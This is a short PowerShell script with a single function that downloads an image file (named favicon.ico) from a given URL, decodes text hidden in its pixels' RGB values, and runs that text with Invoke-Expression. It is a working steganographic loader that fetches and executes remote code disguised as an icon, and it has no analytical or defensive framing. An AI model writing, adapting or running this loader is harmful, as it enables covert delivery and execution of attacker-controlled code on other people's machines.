function Get-FaviconText
{
    
    Param(
        
        [string]$URL,
        [string]$WriteTo
        
        )
        
    $data = (new-object net.webclient).downloaddata($URL)
    
    [system.io.file]::writeallbytes("$WriteTo\favicon.ico",$data)
    
    $dll = [string]::format("$env:SystemRoot\Microsoft.NET\Framework\v{0}.{1}.{2}\System.Drawing.dll",$psversiontable.clrversion.major,$psversiontable.clrversion.minor,$psversiontable.clrversion.build)
    
    add-type -path $dll
    
    $img = [system.drawing.image]::fromfile("$($WriteTo)\favicon.ico")
    
    $final = ""
    
    $locIndex = 0

    while (1) {
        
        try{
            
            if (($img.getpixel($locIndex%32,[math]::floor($locIndex/32)).r) -ne 0) {
                $final += [convert]::tochar($img.getpixel($locIndex%32,[math]::floor($locIndex/32)).r)
            } else { break }

            if (($img.getpixel($locIndex%32,[math]::floor($locIndex/32)).g) -ne 0) {
                $final += [convert]::tochar($img.getpixel($locIndex%32,[math]::floor($locIndex/32)).g)
            } else { break }

            if (($img.getpixel($locIndex%32,[math]::floor($locIndex/32)).b) -ne 0) {
                $final += [convert]::tochar($img.getpixel($locIndex%32,[math]::floor($locIndex/32)).b)
            } else { break }

                $locIndex += 1
                
        }catch{break}
        
    }
    
    $img.dispose()
    
    IEX($final -join '')
    
}
